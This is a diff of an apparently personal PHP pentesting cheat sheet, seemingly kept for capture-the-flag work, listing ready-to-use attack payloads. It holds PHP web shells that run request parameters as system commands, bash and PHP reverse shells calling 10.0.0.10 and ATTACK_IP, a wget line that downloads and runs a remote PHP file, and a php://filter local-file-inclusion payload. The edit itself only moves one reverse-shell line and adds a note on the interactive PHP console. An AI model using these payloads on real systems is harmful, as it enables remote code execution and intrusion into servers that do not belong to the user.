@@ -3,8 +3,9 @@
 <?PHP system($_REQUEST['cmd']); ?>
 <?php system('ls -la');?>
 <?php system("bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
-<?php exec("bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
 <?php system("wget http://ip/file -o /tmp/file.php; php /tmp/file.php"); ?>
+
+<?php exec("bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
 <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
 
 # blind php test
@@ -18,3 +19,7 @@ http://10.10.208.6/?view=php://filter/read=convert.base64-encode/resource=./dog/
 
 # php rev_shell oneliner
 php -r '$sock=fsockopen("ATTACK_IP",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# consola interactiva
+php --interactive
+php> echo urldecode("URL ENCODE")
